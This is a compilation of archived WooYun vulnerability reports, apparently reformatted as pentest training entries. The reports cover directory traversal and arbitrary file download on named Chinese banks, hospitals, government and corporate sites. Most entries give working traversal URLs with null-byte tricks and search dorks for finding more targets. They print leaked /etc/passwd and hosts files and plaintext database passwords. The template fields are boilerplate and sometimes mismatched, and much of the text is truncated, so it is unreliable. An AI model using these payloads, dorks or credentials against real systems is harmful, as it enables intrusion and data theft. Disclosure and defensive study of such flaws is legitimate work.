**详情**: TongWeb Application Server的配置疏忽，导致部分子目录可进行目录遍历，间接导致敏感信息泄露。另外，对于所有htm页面均没有开启解析。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 厂商懂的！
---

---
### [wooyun-2015-0103285] 中国石油某网上银行系统任意文件下载
**厂商**: 中国石油天然气集团公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/Init_signature.jsphttp://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/DownloadFile.web?fileName=/etc/passwdroot:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:100:100::/home/guest:nobody:!:4294967294:4294967294::/:lpd:!:9:4294967294::/:lp:!:11:11::/var/spool/

**POC**: http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/Init_signature.jsphttp://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/DownloadFile.web?fileName=/etc/passwdroot:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0160023] 某成人用品商城文件下载漏洞引发的血案
**厂商**: 爱X客 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 上传功能

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.44GB的rar文件：http://www.91xke.com/web.rar解压一看，果然内容少儿不宜啊。。。各种产品图片，还有12月份新上传的。咦，还有数据库信息，这个价值就大了只可惜MD5没解开，解开的话就不是这么简单了。。。

**POC**: 同上

**绕过**: 直接利用

**修复**: 一个粗心的错误。
---

---
### [wooyun-2015-0136027] 江苏移动智能识别系统目录遍历（数据库泄露）
**厂商**: 中国移动 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江苏移动智能识别系统 - 数据管理后台 **.**.**.**/public/db_backup/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0113397] 安信证券理财超市存在目录遍历漏洞（可遍历服务器敏感信息）
**厂商**: 安信证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安信证券理财超市：http://mall.essence.com.cn/main/index.shtml该站点存在目录遍历漏洞，可遍历浏览服务器敏感信息。

**POC**: 漏洞地址：http://mall.essence.com.cn/cgi-bin/information/PublicationAction?function=Download&path=../../../../../../../../../../../../../sbin/../etc/passwd%00f.pdf可遍历到passwd信息弄一个linux路径文件的字典，用burpsuit intruder跑一下，跑出很多配置文件的信息权限不够跑不出shadow文件。。。

**绕过**: 直接利用

**修复**: 限制路径的权限。。。
---

---
### [wooyun-2016-0167299] 基督復臨安息日會醫療財團法人臺安醫院任意文件下载（臺灣地區）
**厂商**: Hitcon台湾互联网漏洞报告平台 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标：http://**.**.**.**构造，http://**.**.**.**/orthopedics/download.php?name=../../orthopedics/download.phpmysql配置文件下载，http://**.**.**.**/orthopedics/download.php?name=../../lib/dbkeyfunc_mysql/dbkeyfunc_mysql.inc.phpdbkeyfunc_mysql.inc.php中<?php$DBhost ="localhost";$DBuser = "cash";$DBpass = "cash1979417";$dbhost = "localhost";$dbuser = "cash";$dbpass = "cash1979417";$link = mysql_connect("localhost"

**POC**: dbkeyfunc_mysql.inc.php中<?php$DBhost ="localhost";$DBuser = "cash";$DBpass = "cash1979417";$dbhost = "localhost";$dbuser = "cash";$dbpass = "cash1979417";$link = mysql_connect("localhost",$dbuser,$dbpass);mysql_select_db($dbname,$link);?>

**绕过**: 直接利用

**修复**: ..
---

---
### [wooyun-2015-0157303] 济宁医学院附属医院“所有”病人挂号信息泄露(可导出)
**厂商**: 济宁医学院附属医院 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台判断cookie，但是唯一的漏洞就是采用JS跳转。http://**.**.**.**:8053/(S(4kyamhtmkuvajloasnpcm3hu))/master/OrderManage.aspx禁用JS访问，可以导出所有挂号信息。然后从2014~2015的做测试。可以 导出。一直到1953条有点捉急，还有一个地方，存在目录遍历：http://**.**.**.**:8053/(S(na0q125caxqwsvqeas41pqm4))/master/还可以知道医生的值班信息，可以调整、修改。

**POC**: #同上

**绕过**: 直接利用

**修复**: 不要采用JS跳转，用服务器脚本吧。
---

---
### [wooyun-2012-08484] 用友俱乐部目录遍历至源文件打包下载
**厂商**: 用友软件 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tclub.ufida.com.cn/adduser/

**POC**: adduser.rar可下载，包含源文件及数据库链接帐号密码

**绕过**: 直接利用

**修复**: 调整服务器设置
---

---
### [wooyun-2010-0360] 海市网站管理系统任意文件下载漏洞
**厂商**: 海市网站管理系统 | **年份**: 2010 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 海市网站管理系统3.0和5.0版本存在未授权访问漏洞，可下载任意文件，包括数据库文件conn。

**POC**: in 3.0 version:http://www.example.com/manager/conn/download.asp?file=../../cn/bbs/inc/conn.aspin 5.0 version:http://www.historychina.net/download/download.jsp?filepath=/download/download.jsp很抱歉，因为没找到源码文件，不知道5.0版的数据库文件是什么。

**绕过**: 直接利用

**修复**: 禁止源码文件的访问下载权限
---

---
### [wooyun-2013-038060] 考试通漏洞系列1-运维配置错误导致任意源码读取
**厂商**: 考试通 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先发现img.kstong.net和www.kstong.net在同一个ip上本来觉得没什么，但是无意间发现img.kstong.net能够遍历目录遍历目录本来也没觉得什么，但是img.kstong.net和www.kstong.net居然在一台服务器上，而且通过img.kstong.net居然能够读取www.kstong.net所有源代码。这个域名下怎么就不解析呢，这是肿么一回事，我也没搞懂呀！随便展示2个吧！！既然又能遍历目录，又能读取源代码，数据库什么的东东当然就不足话下咯，各种配置文件数据库配置信息数据库文件

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 还是别放一台物理机上了，还是把遍历补补吧！~
---

---
### [wooyun-2014-082455] 用友FE协作办公系统FILE协议文件读取漏洞(通杀全版本)
**厂商**: 用友软件 | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: web.xml有如下配置：<servlet><servlet-name>ProxyServletUtil</servlet-name><servlet-class>fe.witmanage.service.ProxyServletUtil</servlet-class></servlet><servlet-mapping><servlet-name>ProxyServletUtil</servlet-name><url-pattern>/ProxyServletUtil</url-pattern></servlet-mapping>ProxyServletUtil.java源码如下:/*    */   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletExce

**POC**: (1)http://oa.hzuf.com:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties(2)http://fsd2014.f3322.org:9090/ProxyServletUtil?url=file:///d:/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties(3)http://183.129.249.246:9090/ProxySe

**绕过**: 直接利用

**修复**: file://协议过滤
---

---
### [wooyun-2013-035601] 暴风影音多处安全漏洞小礼包（未授权访问等）
**厂商**: 暴风影音 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1，暴风影音某站账户体系控制不严导致可登陆他人账号2，两处目录遍历3，某CMS后台管理系统未授权访问，怀疑废弃#1问题出在暴风推广联盟地址：http://union.baofeng.com/login用户user 密码123456 登陆时抓包以密码不变，对用户名username参数进行猜解部分账号登陆截图zou，bai,qiu,peter,philip,patrick,wilson,#2目录遍历http://119.188.128.7:8000/可下载配置文件http://119.188.128.28/#3 CMS后台未授权访问http://cdnlt.baofeng.com/

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 1，加强登陆接口的验证.2，访问权限控制.3，废弃的就删了吧.
---

---
### [wooyun-2014-068484] 某政府通用系统任意文件下载漏洞
**厂商**: 某政府通用系统 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: google inurl:policylaw/policylaw.dohttp://www.hzxf12345.gov.cn/policylaw/policylaw.do?act=read&filePath=C:\Windows\System32\drivers\etc\hosts&fileContentType=http://218.108.102.212:1234/policylaw/policylaw.do?act=read&filePath=C:\Windows\System32\drivers\etc\hosts&fileContentType=http://xf.jianggan.gov.cn/jgxfw/policylaw/policylaw.do?act=read&filePath=c:/Windows/win.ini&fileContentType=http://122.

**POC**: ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 [MCI Extensions.BAK] aif=MPEGVideo aifc=MPEGVideo aiff=MPEGVideo asf=MPEGVideo asx=MPEGVideo au=MPEGVideo m1v=MPEGVideo m3u=MPEGVideo mp2=MPEGVideo mp2v=MPEGVideo mp3=MPEGVideo mpa=MPEGVideo mpe=MPEGVideo mpeg=MPEGV

**绕过**: 直接利用

**修复**: 限制下载的路径
---

---
### [wooyun-2013-028246] 阿里巴巴日本分站存在目录遍历
**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.alibaba.co.jp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-045969] 友宝在线##友宝在线某站任意文件读取
**厂商**: 友宝在线 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞网站：http://211.151.164.53查看passwd文件(cat /etc/passwd)查看系统版本（相当于cat /etc/redhat-release）换个目录看看吧！（cat /proc/version）

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 呵呵！有礼物就有激情啊！！！
---

---
### [wooyun-2013-043460] 赛迪网任意文件下载漏洞导致数据库用户名和密码泄露
**厂商**: 赛迪网 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://stat.ccidnet.com//count/count.com.php?image=../../../../include.inc/config.inc.phphttp://stat.ccidnet.com//count/count.com.php?image=../../../../count/count.com.php由于image参数未进行任何过滤，导致精心构造好的链接可以下载服务器上任意文件，上面下载数据库配置文件将上面地址复制到迅雷下载，即可下载到其数据库配置文件如图数据库配置文件为数据库用户名为ccidstat    密码为 ccidstat@2008//数据库 ## 安装前请修改一下数据库相关部分 ##define ( 'DB_TYPE', 'mysql' ); #数据库类型define ( 'DB_HOSTNAME', 'localhost' ); #数据

**POC**: 截图如下

**绕过**: 编码绕过

**修复**: 建议过滤参数如../这样的跳转符，一次过滤可能还不行，深层次过滤下吧
---

---
### [wooyun-2013-038063] 某农村信用社目录遍历漏洞导致信用社员工信息泄露
**厂商**: 郑州农村信用社 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 权限设置严点。 其实问题不大。
---

---
### [wooyun-2015-094471] 99个政府有备份文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.qsxw.gov.cn/www.qsxw.gov.cn.rar	4	潜山新闻网|潜山|潜山县|潜山网|潜山门户|中国潜山|安徽潜山|潜山新闻http://www.xzcz.gov.cn/wwwroot.rar	1104	徐州市财政局http://www.hyzhq.gov.cn/hyzhq.rar	402	珠晖区党政门户网站http://www.lnwater.gov.cn/lnwater.rar	1	è?????????°′?????http://www.wjjjy.gov.cn/wjjjy.rar	562	吴江网上健教园http://www.aydj.gov.cn/admin.rar	3	首页  -中共安阳市委组织部http://bjcczx.gov.cn/www.rar	24	陈仓区政协门户网站http://lib.dda.gov.cn/lib.rar	221	

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0115420] 91wan某站点任意文件下载
**厂商**: 广州维动网络 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载：http://lwjs.91wan.com/huodong/bizhi/download.php?f=../../../huodong/bizhi/download.php源代码：<?php$filename = $_GET['f'];$filepath = './desktop/'.$filename;$filename = rawurlencode($filename);if (file_exists($filepath)) {$filename = $filename ? $filename : basename($filepath);$filetype = trim(substr(strrchr($filename, '.'), 1));$filesize = filesize($filepath);header('Cache-control: max-age=315

**POC**: 读hosts：http://lwjs.91wan.com/huodong/bizhi/download.php?f=../../../../../../../etc/hosts192.168.1.14  passport.91wan.com192.168.1.234  datacenter1.91wan.com192.168.1.235  datacenter2.91wan.com192.168.1.22   datacenter3.91wan.com192.168.1.23   datacenter4.91wan.com192.168.1.17  bbs.91wan.com192.168.1

**绕过**: 直接利用

**修复**: 参数过滤，不允许跨父目录
---

---
### [wooyun-2016-0207570] 神器而已之海南航空存在任意文件读取漏洞
**厂商**: hnair.com | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://zzgq.hnair.com/frontend/ticketChange/ticketChange_toTicketChange.actionhttp://zzgq.hnair.com/tang/passwdhttp://zzgq.hnair.com/tang/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain610.2.40.141 petsrvhk5110.72.14.21 ldapserver1.eking.com10.72.14.22 ldapserver2.eking.com10.2.40.159 p

**POC**: 1000-7

**绕过**: 直接利用

**修复**: 补丁该打了，运维也该*了，能动手尽量不跟运维bb。
---

---
### [wooyun-2015-0143678] KPPW最新版一处函数七处注入附送后台任意文件删除两枚加注入一枚
**厂商**: keke.com | **年份**: 2015 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在   \lib\sys\keke_shop_release_class.php 的save_service_obj函数中部分代码如下public function save_service_obj($release_info = array(), $obj_name) {global $kekezu;if ($release_info ['step1'] == 'step1') {if ($_POST ['fileid1']) {$fileIdArr = explode('|', $_POST ['fileid1']);if(is_array($fileIdArr)){$fileIdStr = implode(',', $fileIdArr);$filePathArr = db_factory::query('select save_name from '.TABLEPRE.'w

**POC**: 如上。

**绕过**: 直接利用

**修复**: 同在武汉，求请吃饭。
---

---
### [wooyun-2012-013719] j2ee分层架构安全（注册乌云1周年庆祝集锦） --  世纪佳缘
**厂商**: 世纪佳缘 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先看一个以前典型的case:WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）或哥这篇粗糙的文章：http://hi.baidu.com/shine%5F%C9%C1%C1%E9/blog/item/7d7d57445f523a4384352468.html

**POC**: http://111.13.45.73/WEB-INF/web.xml<beans xsi:schemaLocation="   http://www.springframework.org/schema/beans    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd   http://www.springframework.org/schema/tx   http://www.springframework.org/schema/tx/spring-tx-3.0.xsd   http://www.spring

**绕过**: 直接利用

**修复**: 多注意WEB-INF目录！
---

---
### [wooyun-2014-063518] 某政府学校通用系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可以谷歌一下inurl:down.asp?FileName当然，关键字还有其他的就随便列5个吧明光市人力资源和社会保障局http://www.mg12333.gov.cn/down.asp?FileName=../conn.asp.嘉祥人力资源和社会保障局http://www.jxrsrc.gov.cn/down.asp?FileName=../conn.asp.甘肃教育信息网http://www.nxjy.net/down.asp?FileName=../conn.asp.中国计量大学http://lxxy.cjlu.edu.cn/down.asp?FileName=../conn.asp.中国计量大学http://gh.cjlu.edu.cn/down.asp?FileName=../conn.asp.其他还有，自查吧后面加个.是为了突破下载，不然asp的文件是不能下载的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2014-088300] 浙江传媒学院官网存在目录遍历漏洞导致数据库帐号密码等敏感信息泄漏
**厂商**: 浙江传媒学院 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙江传媒学院官网存在目录严重的遍历漏洞导致数据库被脱裤以及敏感信息泄漏，轻松获取数据库帐号密码，网站更新日志，网站后台，一些文件

**POC**: 队友上高数 Q发我某个平台说附近一堆学校注册 怕我们被打脸....然后然后  浙江传媒学院官网   http://www.zjicm.edu.cn/目录遍历  http://www.zjicm.edu.cn/config/   （我一直觉得能把config目录给遍历的学校也是有点叼的 ）然后数据库信息在xml里面 居然还明文密码因为要内网  附近传媒的wifi也不好用~我就不去脱了  ...然后日志在这里    （logs为何要在根目录）Logs    http://www.zjicm.edu.cn/logs/然后 我好像知道了编辑器（上传点）在哪里而且还不止一个 这里也是http://www

**绕过**: 直接利用

**修复**: 修复目录遍历，后台地址，logs为何要在根目录，数据信息可以用密文的，防火墙似乎比那种简单弹个框的毫无用处的防注入要强的多
---

---
### [wooyun-2013-045426] 南方周末邮件服务器任意文件读取漏洞
**厂商**: 南方周末 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1 漏洞信息Zimbra - 0day exploit / Privilegie escalation via LFIhttp://www.exploit-db.com/exploits/30085/#2 利用地址http://mail.infzm.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../etc/passwd%00#3 获取Zimbra邮件服务器核心配置文件内容http://mail.infzm.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=0912141754

**POC**: #3 漏洞证明root:0:0:root:/root:/bin/bashbin:1:1:bin:/bin:/sbin/nologindaemon:2:2:daemon:/sbin:/sbin/nologinadm:3:4:adm:/var/adm:/sbin/nologinlp:4:7:lp:/var/spool/lpd:/sbin/nologinsync:5:0:sync:/sbin:/bin/syncshutdown:6:0:shutdown:/sbin:/sbin/shutdownhalt:7:0:halt:/sbin:/sbin/haltmail:8:12:mail:/var/spoo

**绕过**: 直接利用

**修复**: #更新Zimbra服务端最新补丁
---

---
### [wooyun-2015-0116211] 上海聚信立主站任意文件下载
**厂商**: juxinli.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://www.juxinli.com/down_load?args=../../../../../../../../../../etc/passwd

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-088699] PHPAPP注入第四枚（各种无视过滤）
**厂商**: PHPAPP | **年份**: 2014 | **类型**: SQL注射漏洞

**元思考**: 触发信号: 参数注入

**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在wooyun上看到了有人提了PHPAPP的漏洞： http://wooyun.org/bugs/wooyun-2010-055604，然后去官网看了看，前几天刚有更新，就在官网下了PHPAPP最新的v2.6来看看(2014-12-11更新的)。PSOT注入点：wwww.xxx.com/member.php?action=1&app=43&cid=1&rid=2, 存在漏洞的文件在/phpapp/apps/refund/member_phpapp.php下面分析一下漏洞产生的原因第一处绕过：先看看是如何得到$_POST中的内容的，$this->POST=$this->POSTArray();去看看POSTArray()/phpapp/apps/core/class/core_class_phpapp.phpfunction POSTArray(){$postarr=array();if(i

**POC**: 见 详细证明

**绕过**: 过滤绕过

**修复**: $this->str()
---

---
### [wooyun-2014-071340] 某政府应用管理系统存在任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://music.google.cn/search?newwindow=1&q=inurl%3Acomm_front&btnG=Google+%E6%90%9C%E7%B4%A2厂商：湖南科创信息技术股份有限公司http://www.chinacreator.com/

**POC**: http://www.hn408.org/comm_front/tzzx/download.jsp?file=/WEB-INF/web.xmlhttp://www.zixing.gov.cn/comm_front/tzzx/download.jsp?file=/WEB-INF/web.xmlhttp://yuanjiang.gov.cn/comm_front/tzzx/download.jsp?file=/WEB-INF/web.xmlhttp://www.hn12333.com:81/comm_front/tzzx/download.jsp?file=/WEB-INF/web.xml等许多。

**绕过**: 直接利用

**修复**: 限制下载文件的路径
---

---
### [wooyun-2015-0122273] 今日天下通应用配置错误导致大量用户信息泄露
**厂商**: 今日天下通 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://114.80.79.146:8000/ 目录遍历泄露用户订单等相关信息错误信息里泄露了网站目录

**POC**: 错误信息里泄露了网站目录

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2015-0151115] 中国检验检疫电子业务网某站任意文件下载
**厂商**: 中国检验检疫电子业务网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实找很简单 费不了那么长时间 自己漏洞发了很多 rank很少 求不给2rankinurl:do_download.jsp还有类似于download.jsp这样的 就可以找不少http://**.**.**.**/do_download.jsp?path=C:\Windows\System32\drivers\etc\hosts&isLogin=1 江苏省科技型中小企业备案系统http://**.**.**.**/zjk/download/do_download.jsp?filename=../web-inf/web.xml  中国机械工业科学技术奖http://**.**.**.**/Common/Js/WebEdit/do_download.jsp?UpLoadPath=WebGlzx/DB/&FileName=../../web-inf/web.xml 交通部公路研究中心http:/

**POC**: 其实找很简单 费不了那么长时间 自己漏洞发了很多 rank很少 求不给2rankinurl:do_download.jsp download.jsp 就可以找到一些http://**.**.**.**/do_download.jsp?path=C:\Windows\System32\drivers\etc\hosts&isLogin=1 江苏省科技型中小企业备案系统http://**.**.**.**/zjk/download/do_download.jsp?filename=../web-inf/web.xml  中国机械工业科学技术奖http://**.**.**.**/Common/Js

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2015-0143372] 图搜天下某处目录遍历导致大量内部员工姓名/电话等泄漏还有考勤信息/外出信息等
**厂商**: 图搜天下（北京）科技有限公司 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mask 区域1.http://**.**.**一张图先证明是图搜天下的http://220.181.105.91:8888/download/uploadAttachement/1414058226036/bmp_sy_test.bmphttp://220.181.105.91:8888/download/144/这里全是敏感信息我就截图几个证明下http://220.181.105.91:8888/download/144/29/94277420/http://220.181.105.91:8888/download/144/28/90767358/http://220.181.105.91:8888/download/144/30/85474937/

**POC**: 141020：1.熟悉测试案例(E:\1-Tstx\4-项目需求文档\测试用例141020\农牧版本手机端+平台端测试用例\手机端\今日待办-新增经销商 168#);2.三元定制化测试（任晓明-字段，业务逻辑：客户端提交信息-平台人工审核-客户端再同步-再同步至平台）； 先看三元需求测试点；测试机：huaweC8815-A00000491D06DE-huawei8815, SamsungG3502 -359357053133428-三星G3502; 三星N719-353945053616032-Sysp,admin,admin// 公告、竞品信息录入两人分工；141017:客服系统学习－v3.

**绕过**: 直接利用

**修复**: 设置好服务器配置
---

---
### [wooyun-2014-052241] 姐妹街用户信息泄露（用户名 密码大量信息泄露）
**厂商**: 姐妹街 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 姐妹街用户信息泄露（用户名 密码大量信息泄露） 目录遍历可查任何数据 找到数据库 可查看所有信息 还有很多.http://www.jiemeijie.com/public/db_backup/20140228025755.php/member/0.sql

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我懂得多..
---

---
### [wooyun-2014-088668] 上海交通大学任意文件读取漏洞！
